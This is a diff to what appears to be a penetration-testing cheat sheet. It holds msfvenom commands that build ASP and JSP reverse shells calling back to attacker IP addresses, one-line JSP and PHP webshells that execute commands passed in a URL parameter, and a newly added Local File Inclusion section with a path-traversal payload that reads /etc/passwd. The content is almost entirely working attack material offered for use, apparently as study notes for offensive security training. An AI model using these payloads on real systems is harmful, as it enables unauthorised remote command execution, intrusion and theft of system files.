@@ -159,7 +159,7 @@ cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 ASP : msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.45 LPORT=2323 -f asp -a x86 --platform win -o shell.asp
       
 JSP : msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.42 LPORT=4444 -f raw > shell.jsp
-      JSP webshell <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+    <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
       
 PHP : <?php echo passthru($_GET['cmd']); ?>
       <?php echo shell_exec($_GET['cmd']); ?>
@@ -177,3 +177,12 @@ Powershell location<br />
 -32-bit (x86) PowerShell executable C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
 -64-bit (x64) Powershell executable C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe  
 ```
+
+
+## Local File Inclusion (LFI)
+Put files locally on the target and trigger webshell by browsing the page. <br />
+```sh 
+http://target.com/?page=home
+http://target.com/?page=./../../../../../../../../../etc/passwd%00
+```
+eg. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
